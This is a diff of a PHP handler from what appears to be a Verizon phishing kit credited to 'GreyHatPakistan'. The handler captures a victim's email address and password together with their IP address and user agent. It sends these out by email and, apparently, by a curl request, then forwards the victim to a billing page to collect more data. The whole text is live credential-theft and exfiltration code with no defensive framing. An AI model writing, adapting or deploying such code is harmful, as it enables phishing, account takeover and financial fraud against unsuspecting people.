@@ -11,9 +11,9 @@ $useragent = $_SERVER['HTTP_USER_AGENT'];
 		$_SESSION['email'] 	  = $_POST['email'];
 		$_SESSION['password'] 	  = $_POST['password'];
 		$code = <<<EOT
-»»————-　★[ ⚫️🌀 Verizon Account ⚫️🌀 ]★　————-««
-[User ID or Verizon mobile number] 		: {$_SESSION['email']}
-[Verizon Password]		: {$_SESSION['password']}
+»»————-　★[ ⚫️🌀 Verizon Email Access ⚫️🌀 ]★　————-««
+[Email Address] 		: {$_SESSION['email']}
+[Email Password]		: {$_SESSION['password']}
 »»————-　★[ 💻🌏 DEVICE INFO 🌏💻  ]★　————-««
 IP		: $ip
 IP lookup		: http://ip-api.com/json/$ip
@@ -24,7 +24,7 @@ OS		: $useragent
 \r\n\r\n
 EOT;
 		if ($sendtoemail=="yes"){
-		$subject = "🏛️ Verizon Account By GreyHatPakistan 🏛️  From $ip";
+		$subject = "🏛️ Verizon Email Access By GreyHatPakistan 🏛️  From $ip";
         $headers = "From: 🏛️ GreyHatPakistan 🏛️ <newfullz@sh33nz0.com>\r\n";
         $headers .= "MIME-Version: 1.0\r\n";
         $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
@@ -44,7 +44,7 @@ EOT;
     curl_close($ch);
 	}
 	
-        header("Location: ../Email.php");
+        header("Location: ../Billing.php");
         exit();
 	} else {
 		header("Location: ../index.php");
